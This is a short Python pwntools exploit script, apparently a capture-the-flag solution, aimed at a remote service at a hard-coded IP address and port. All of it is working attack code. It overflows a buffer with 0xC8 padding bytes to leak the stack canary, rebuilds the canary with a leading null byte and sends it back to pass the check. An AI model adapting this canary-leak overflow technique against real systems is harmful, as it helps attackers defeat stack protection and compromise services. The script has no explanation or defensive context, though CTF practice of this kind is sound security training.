from pwn import *

p = remote("34.170.146.252", 53934)

offset = 0xC8
payload = b"A" * offset + b"B"

p.recvuntil(b"Input:\n")
p.send(payload)

p.recvuntil(b"Output:\n")
p.recvuntil(b"B")

leaked_bytes = p.recv(7)

canary = b"\x00" + leaked_bytes
log.info(f"Leaked Canary: {hex(u64(canary))}")

p.recvuntil(b"Canary?\n")
p.send(canary)

print(p.recvall().decode())
